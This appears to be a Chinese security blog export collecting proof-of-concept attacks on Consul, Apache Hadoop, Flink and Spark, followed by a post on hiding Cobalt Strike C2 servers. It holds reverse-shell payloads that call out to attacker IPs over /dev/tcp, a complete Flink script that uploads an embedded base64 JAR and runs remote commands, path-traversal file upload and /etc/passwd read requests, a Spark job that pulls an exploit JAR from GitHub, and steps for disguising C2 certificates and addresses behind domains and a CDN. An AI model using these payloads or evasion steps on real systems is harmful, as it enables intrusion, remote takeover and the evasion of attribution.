&#x2F;dev&#x2F;tcp&#x2F;172.16.58.147&#x2F;9999 0&gt;&amp;1&quot;,</span><br><span class="line">				&quot;Args&quot;: [&quot;sh&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8172.16.58.147&#x2F;9999 0&gt;&amp;1&quot;],</span><br><span class="line">				&quot;interval&quot;: &quot;10s&quot;,</span><br><span class="line">				&quot;Timeout&quot;: &quot;86400s&quot;</span><br><span class="line">			&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="REXEC-RCE"><a href="#REXEC-RCE" class="headerlink" title="REXEC RCE"></a>REXEC RCE</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;v1&#x2F;agent&#x2F;self</span><br><span class="line">DisableRemoteExec: false</span><br><span class="line"></span><br><span class="line">PUT &#x2F;v1&#x2F;session&#x2F;create HTTP&#x2F;1.1</span><br><span class="line">Host: 88.1.2.65:8500</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Consul-Token:</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 68</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;Behavior&quot;: &quot;delete&quot;,</span><br><span class="line">	&quot;Name&quot;: &quot;Remote Exec&quot;,</span><br><span class="line">	&quot;TTL&quot;: &quot;30s&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PUT &#x2F;v1&#x2F;kv&#x2F;_rexec&#x2F;7b3fb95a-a281-e8b1-7a70-1715d96f7b9b&#x2F;job?acquire&#x3D;7b3fb95a-a281-e8b1-7a70-1715d96f7b9b HTTP&#x2F;1.1</span><br><span class="line">Host: 88.1.2.65:8500</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;Command&quot;: &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;88.1.12.229&#x2F;9999 0&gt;&amp;1&quot;,</span><br><span class="line">	&quot;Wait&quot;: 2000000000</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PUT &#x2F;v1&#x2F;event&#x2F;fire&#x2F;_rexec HTTP&#x2F;1.1</span><br><span class="line">Host: 88.1.2.65:8500</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;Prefix&quot;: &quot;_rexec&quot;,</span><br><span class="line">	&quot;Session&quot;: &quot;7b3fb95a-a281-e8b1-7a70-1715d96f7b9b&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">删除</span><br><span class="line">GET</span><br><span class="line">v1&#x2F;kv&#x2F;_rexec&#x2F;7b3fb95a-a281-e8b1-7a70-1715d96f7b9b&#x2F;?keys&#x3D;&amp;wait&#x3D;2000ms</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PUT &#x2F;v1&#x2F;session&#x2F;destroy&#x2F;7b3fb95a-a281-e8b1-7a70-1715d96f7b9b</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Consul</tag>
      </tags>
  </entry>
  <entry>
    <title>apache-hadoop</title>
    <url>/2021/04/14/apache-hadoop/</url>
    <content><![CDATA[<p>Apache Hadoop是一套用于在由通用硬件构建的大型<a href="https://baike.baidu.com/item/%E9%9B%86%E7%BE%A4/5486962">集群</a>上运行应用<a href="https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F/71525">程序</a>的框架。<a id="more"></a></p>
<p>可能存在的未授权访问端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a )HDFS</span><br><span class="line">NameNode默认端口 50070</span><br><span class="line">DataNode默认端口50075</span><br><span class="line">httpfs 默认端口14000</span><br><span class="line">journalnode默认端口8480</span><br><span class="line"></span><br><span class="line">b )YARN (JobTracker)</span><br><span class="line">ResourceManager默认端口8088</span><br><span class="line">JobTracker默认端口50030</span><br><span class="line">TaskTracker默认端口 50060</span><br><span class="line"></span><br><span class="line">c)Hue默认端口8080</span><br><span class="line"></span><br><span class="line">d ）YARN (JobTracker)</span><br><span class="line">master默认端 60010</span><br><span class="line">regionserver 默认端口60030</span><br><span class="line"></span><br><span class="line">e)hive-server2默认端口10000</span><br><span class="line"></span><br><span class="line">f)spark-jdbcserver 默认端口10003</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="未授权访问RCE"><a href="#未授权访问RCE" class="headerlink" title="未授权访问RCE"></a>未授权访问RCE</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;120.25.102.15:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;103.45.190.251&#39; # put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;syou&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br></pre></td></tr></table></figure>
<p>工具：unauth_exp.py</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>apache-hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>apache-flink</title>
    <url>/2021/04/14/apache-flink/</url>
    <content><![CDATA[<p>Apache Flink 是一个分布式大数据处理引擎，可对有限数据流和无限数据流进行有状态或无状态的计算，能够部署在各种集群环境，对各种规模大小的数据进行快速计算。<a id="more"></a></p>
<h1 id="后台JAR上传GetShell"><a href="#后台JAR上传GetShell" class="headerlink" title="后台JAR上传GetShell"></a>后台JAR上传GetShell</h1><p>弄个jar包上传就完了</p>
<p>python xx.py -u xx -c whoami</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding:utf-8</span><br><span class="line"># Build By LandGrey</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line">import argparse</span><br><span class="line">import traceback</span><br><span class="line">import cStringIO</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_jar_exsits(site, upload_jar_name):</span><br><span class="line">    list_jar_url &#x3D; &quot;&#123;&#125;&#x2F;jars&#x2F;&quot;.format(site)</span><br><span class="line">    response &#x3D; requests.get(list_jar_url, headers&#x3D;default_headers, verify&#x3D;False, timeout&#x3D;30, proxies&#x3D;proxies)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200 and &quot;application&#x2F;json&quot; in response.headers.get(&quot;Content-Type&quot;, &quot;&quot;):</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; json.loads(response.text)</span><br><span class="line">            for upload_file in r[&#39;files&#39;]:</span><br><span class="line">                if str(upload_file[&#39;id&#39;]).endswith(&#39;&#123;&#125;&#39;.format(upload_jar_name)):</span><br><span class="line">                    return upload_file[&#39;id&#39;]</span><br><span class="line">        except Exception as e:</span><br><span class="line">            return False</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def upload_execute_jar(site, upload_jar_name):</span><br><span class="line">    upload_jar_url &#x3D; &quot;&#123;&#125;&#x2F;jars&#x2F;upload&quot;.format(site)</span><br><span class="line">    file_content &#x3D; base64.b64decode(&#39;UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAAAAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU&#x2F;k4yyUwmQy+TQlsQBdSStqSxiIotIlAKVkJbSa0G8DKZHpPTJjNhLjTVCvoQ&#x2F;ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz&#x2F;4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J&#x2F;K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLvCGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5YuAJpzItA7AGw&#x2F;F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujCQNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJNaFY2AVawxDr6uToe9gCeSPsp&#x2F;gTQoYy9syTI5k+bJw8n6VkogAws2&#x2F;zCkVKcqWX5WWNQN1UNtjOQK6oB73H6pSxQMDHnxpH5Dp&#x2F;asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM&#x2F;G3gEoeKxgV9Qo0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs10noOmk8Tix3&#x2F;FM1fKK&#x2F;EHIHZtPj95lONotLM1ukjeFH&#x2F;jRXSGzhB9YXiDNR7tOW&#x2F;8hIUMP1TfnNMKA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2&#x2F;TgTFXq5Y&#x2F;z5uUtOJELGHXXNmyuBvKSjoRF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqps0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJcVMF0uJc8U2jPknuGAemVK20VMye9voa6F&#x2F;C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEsOJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6EjptI4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu&#x2F;RXpE9wXm8H&#x2F;l9St4m5dsMv+MDWsXI28IOYg1zFP8jQjwifhEfU5+nCKWQ&#x2F;TQ9l6IsP&#x2F;kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1bU+Iigi&#x2F;MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQAFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUGAAAAAAMAAwC4AAAArgQAAAAA&#39;)</span><br><span class="line">    files &#x3D; &#123;&#39;jarfile&#39;: (upload_jar_name, cStringIO.StringIO(file_content), &#39;application&#x2F;octet-stream&#39;)&#125;</span><br><span class="line">    try:</span><br><span class="line">        requests.post(upload_jar_url, headers&#x3D;default_headers, files&#x3D;files, timeout&#x3D;30, verify&#x3D;False, proxies&#x3D;proxies)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete_exists_jar(site, jar_hash_name):</span><br><span class="line">    single_jar_url &#x3D; &quot;&#123;&#125;&#x2F;jars&#x2F;&#123;&#125;&quot;.format(site, jar_hash_name)</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; requests.delete(single_jar_url, headers&#x3D;default_headers, verify&#x3D;False, timeout&#x3D;30, proxies&#x3D;proxies)</span><br><span class="line">        if response.status_code &#x3D;&#x3D; 200 and &quot;application&#x2F;json&quot; in response.headers.get(&quot;Content-Type&quot;, &quot;&quot;):</span><br><span class="line">            return True</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return False</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify(site):</span><br><span class="line">    jar_hash_name &#x3D; check_jar_exsits(site, upload_jar_name)</span><br><span class="line">    if jar_hash_name:</span><br><span class="line">        delete_exists_jar(site, jar_hash_name)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        upload_execute_jar(site, upload_jar_name)</span><br><span class="line">        jar_hash_name &#x3D; check_jar_exsits(site, upload_jar_name)</span><br><span class="line">        delete_exists_jar(site, jar_hash_name)</span><br><span class="line">        if jar_hash_name:</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exec_command(site, command):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Content-Type&#39;: &#39;application&#x2F;json;charset&#x3D;utf-8&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    jar_hash_name &#x3D; check_jar_exsits(site, upload_jar_name)</span><br><span class="line">    data &#x3D; r&#39;&#123;&quot;entryClass&quot;:&quot;Execute&quot;,&quot;parallelism&quot;:null,&quot;programArgs&quot;:&quot;\&quot;%s\&quot;&quot;,&quot;savepointPath&quot;:null,&quot;allowNonRestoredState&quot;:null&#125;&#39; % command</span><br><span class="line">    if jar_hash_name:</span><br><span class="line">        execute_cmd_url &#x3D; &#39;&#123;&#125;&#x2F;jars&#x2F;&#123;&#125;&#x2F;run?entry-class&#x3D;Execute&amp;program-args&#x3D;&quot;&#123;&#125;&quot;&#39;.format(site, jar_hash_name, command)</span><br><span class="line">    else:</span><br><span class="line">        upload_execute_jar(site, upload_jar_name)</span><br><span class="line">        jar_hash_name &#x3D; check_jar_exsits(site, upload_jar_name)</span><br><span class="line">        if jar_hash_name:</span><br><span class="line">            execute_cmd_url &#x3D; &#39;&#123;&#125;&#x2F;jars&#x2F;&#123;&#125;&#x2F;run?entry-class&#x3D;Execute&amp;program-args&#x3D;&quot;&#123;&#125;&quot;&#39;.format(site, jar_hash_name, command)</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">    try:</span><br><span class="line">        r1 &#x3D; requests.post(execute_cmd_url, headers&#x3D;headers, data&#x3D;data, verify&#x3D;False, timeout&#x3D;20, proxies&#x3D;proxies)</span><br><span class="line">        match &#x3D; re.findall(&#39;\|@\|(.*?)\|@\|&#39;, r1.text)</span><br><span class="line">        if will_delete_jar:</span><br><span class="line">            delete_exists_jar(site, jar_hash_name)</span><br><span class="line">        if match:</span><br><span class="line">            return match[0][:-2] if match[0][:-2] else &quot;[result is blank]&quot;</span><br><span class="line">    except requests.exceptions.ReadTimeout as e:</span><br><span class="line">        return &quot;[execute timeout]&quot;</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    start &#x3D; time.time()</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;-u&quot;, dest&#x3D;&#39;url&#39;, default&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, type&#x3D;str, help&#x3D;&#39;such as: http:&#x2F;&#x2F;127.0.0.1:8081&#39;)</span><br><span class="line">    parser.add_argument(&#39;-c&#39;, dest&#x3D;&#39;command&#39;, default&#x3D;&#39;&#39;, type&#x3D;str, help&#x3D;&#39;command that your will execute on target&#39;)</span><br><span class="line">    parser.add_argument(&#39;--delete&#39;, dest&#x3D;&#39;delete&#39;, default&#x3D;&#39;&#39;, action&#x3D;&quot;store_true&quot;, help&#x3D;&#39;delete jar after execute command&#39;)</span><br><span class="line">    parser.add_argument(&#39;--proxy&#39;, dest&#x3D;&#39;proxy&#39;, default&#x3D;None, type&#x3D;str, help&#x3D;&#39;request http&#x2F;https proxy&#39;)</span><br><span class="line"></span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        sys.argv.append(&#39;-h&#39;)</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line">    url &#x3D; args.url</span><br><span class="line">    command &#x3D; args.command</span><br><span class="line">    proxy &#x3D; args.proxy</span><br><span class="line">    will_delete_jar &#x3D; args.delete</span><br><span class="line"></span><br><span class="line">    target &#x3D; url.rstrip(&#39;&#x2F;&#39;)</span><br><span class="line">    upload_jar_name &#x3D; &#39;check-execute.jar&#39;</span><br><span class="line">    proxies &#x3D; &#123;&#39;http&#39;: proxy, &#39;https&#39;: proxy&#125;</span><br><span class="line">    default_headers &#x3D; &#123;&#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;61.0 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">    if &quot;:&#x2F;&#x2F;&quot; not in target:</span><br><span class="line">        target &#x3D; &quot;http:&#x2F;&#x2F;&quot; + target</span><br><span class="line">    try:</span><br><span class="line">        if command:</span><br><span class="line">            r &#x3D; exec_command(target, command)</span><br><span class="line">            if r:</span><br><span class="line">                print(&quot;[^_^] [ &#123;&#125; ] execute success, result:\n&#123;&#125;&quot;.format(command, r.replace(&#39;\\n&#39;, &#39;\n&#39;)))</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[&gt;_&lt;] [ &#123;&#125; ] is not vulnerable&quot;.format(url))</span><br><span class="line">        else:</span><br><span class="line">            r &#x3D; verify(target)</span><br><span class="line">            if r:</span><br><span class="line">                print(&quot;[^_^] [ &#123;&#125; ] is vulnerable, testing upload jar successfully !&quot;.format(url))</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;[&gt;_&lt;] [ &#123;&#125; ] is not vulnerable&quot;.format(url))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;[&gt;_&lt;] cannot rce!&quot;)</span><br><span class="line">        print(&quot;[&gt;_&lt;] Error: \n&quot;)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>工具：flink-unauth-rce.py</p>
<h1 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.79:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------721072898</span><br><span class="line">Content-Length: 150</span><br><span class="line"></span><br><span class="line">----------721072898</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;11.txt&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">----------721072898--</span><br></pre></td></tr></table></figure>
<h1 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.170:8081&#x2F;&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>apache-flink</tag>
      </tags>
  </entry>
  <entry>
    <title>apache-spark</title>
    <url>/2021/04/14/apache-spark/</url>
    <content><![CDATA[<p><em>Apache</em> <em>Spark</em> 是专为大规模数据处理而设计的快速通用的计算引擎。<a id="more"></a></p>
<h1 id="未授权访问RCE"><a href="#未授权访问RCE" class="headerlink" title="未授权访问RCE"></a>未授权访问RCE</h1><p>msf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;linux&#x2F;http&#x2F;spark_unauth_rce</span><br></pre></td></tr></table></figure>
<p>手动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Example</span><br><span class="line">.&#x2F;submit.sh \</span><br><span class="line">1.1.1.1:6066 \</span><br><span class="line">2.2.0 \</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aRe00t&#x2F;rce-over-spark&#x2F;raw&#x2F;master&#x2F;Exploit.jar \</span><br><span class="line">&quot;whoami,w,cat &#x2F;proc&#x2F;version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST包</span><br><span class="line">http:&#x2F;&#x2F;$&#123;target&#125;&#x2F;v1&#x2F;submissions&#x2F;create</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,</span><br><span class="line">  &quot;clientSparkVersion&quot;: &quot;$&#123;version&#125;&quot;,</span><br><span class="line">  &quot;appArgs&quot;: [</span><br><span class="line">    &quot;$&#123;jar_args&#125;&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;appResource&quot;: &quot;$&#123;jar_url&#125;&quot;,</span><br><span class="line">  &quot;environmentVariables&quot;: &#123;</span><br><span class="line">    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;mainClass&quot;: &quot;Exploit&quot;,</span><br><span class="line">  &quot;sparkProperties&quot;: &#123;</span><br><span class="line">    &quot;spark.jars&quot;: &quot;$&#123;jar_url&#125;&quot;,</span><br><span class="line">    &quot;spark.driver.supervise&quot;: &quot;false&quot;,</span><br><span class="line">    &quot;spark.app.name&quot;: &quot;Exploit&quot;,</span><br><span class="line">    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,</span><br><span class="line">    &quot;spark.master&quot;: &quot;spark:&#x2F;&#x2F;$&#123;target&#125;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>工具：rce-over-spark-master.zip</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>apache-spark</tag>
      </tags>
  </entry>
  <entry>
    <title>用域名隐匿CobaltStrikeC2</title>
    <url>/2021/04/17/%E7%94%A8%E5%9F%9F%E5%90%8D%E9%9A%90%E5%8C%BFCobaltStrikeC2/</url>
    <content><![CDATA[<p>记录一下<a id="more"></a></p>
<h1 id="入门-修改CobaltStrike特征进行隐藏"><a href="#入门-修改CobaltStrike特征进行隐藏" class="headerlink" title="入门-修改CobaltStrike特征进行隐藏"></a>入门-修改CobaltStrike特征进行隐藏</h1><h2 id="修改证书"><a href="#修改证书" class="headerlink" title="修改证书"></a>修改证书</h2><p>查看store信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>
<p>原证书文件有肉眼可见的特征</p>
<p><img src="/images/C2-1.jpg" alt="C2-1"></p>
<p>在原store文件的基础下修改，修改的东西包括别名、区域、组织等等一些注册信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias google.com -dname &quot;CN&#x3D;US, OU&#x3D;google.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure>
<h2 id="修改端口"><a href="#修改端口" class="headerlink" title="修改端口"></a>修改端口</h2><p>直接改teamserver文件最后一行</p>
<h2 id="自定义Malleable-C2配置文件"><a href="#自定义Malleable-C2配置文件" class="headerlink" title="自定义Malleable C2配置文件"></a>自定义Malleable C2配置文件</h2><p>网上有</p>
<h1 id="新手-利用隐匿域名进行隐藏"><a href="#新手-利用隐匿域名进行隐藏" class="headerlink" title="新手-利用隐匿域名进行隐藏"></a>新手-利用隐匿域名进行隐藏</h1><p>注册一个不用备案的域名，<a href="https://my.freenom.com/">这个网站</a>可注册不用备案的域名，而且还是免费的。然后解析到自己的vps上，所有填IP的地方全部改成域名就行了。切记不能用80，443这种端口，域名解析到国内vps上没有备案的话这两个端口是不解析的（因为被某种墙大力量拦了）。</p>
<h1 id="学徒-利用隐匿域名-CDN进行隐藏"><a href="#学徒-利用隐匿域名-CDN进行隐藏" class="headerlink" title="学徒-利用隐匿域名+CDN进行隐藏"></a>学徒-利用隐匿域名+CDN进行隐藏</h1><p>本着白嫖的原则，能白嫖就白嫖。域名白嫖了，CDN其实也是可以小小白嫖一下的。</p>
<p>拿着已经注册的域名，到<a href="https://dash.cloudflare.com/">这里</a>可以白嫖到免费的CDN，虽然免费的节点不多，但还是可以隐匿真实vps地址的。</p>
<p>添加一条A记录到你的vps就行了。NS记录在DNS通信的情况下会用到。</p>
<p>这个方法在我看来是防君子不防小人，想要真正隐藏还是得花钱买CDN。</p>
<p><img src="/images/C2-2.png" alt="C2-2"></p>
<h1 id="进阶-利用隐匿域名-CDN-HTTPS进行隐藏"><a href="#进阶-利用隐匿域名-CDN-HTTPS进行隐藏" class="headerlink" title="进阶-利用隐匿域名+CDN+HTTPS进行隐藏"></a>进阶-利用隐匿域名+CDN+HTTPS进行隐藏</h1><p>Scripted Web Delivery，也就是常说的一句话中，SSL默认是不开启的，当你在配置了SSL证书后这个按钮才会可选。HTTPS也可以避免一些溯源。</p>
<p><img src="/images/C2-3.png" alt="C2-3"></p>
<p>平常使用的http传输的一句话木马可能会遭到未知力量的拦截，使用https可以减少这种事件的发生。</p>
<p>首先我们需要申请一个证书，域名上面已经申请过了。在<a href="https://freessl.cn/">这里</a>可以申请免费的证书。详细的流程步骤可以看<a href="https://shimo.im/docs/3RjkWKcQxkrPwxyd/read">这里</a>，我也是看这里来的。</p>
<p>接下来是配置C2，流程其实在刚刚的链接里都写清楚了。简略一下</p>
